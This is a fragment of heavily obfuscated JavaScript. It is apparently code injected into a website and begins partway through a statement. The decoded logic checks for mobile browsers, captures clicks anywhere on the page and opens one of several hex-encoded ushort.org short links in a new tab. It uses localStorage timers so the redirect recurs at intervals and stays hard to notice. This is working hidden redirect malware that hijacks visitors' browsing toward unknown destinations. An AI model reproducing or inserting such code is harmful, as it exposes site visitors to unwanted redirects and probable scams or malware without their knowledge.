_0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());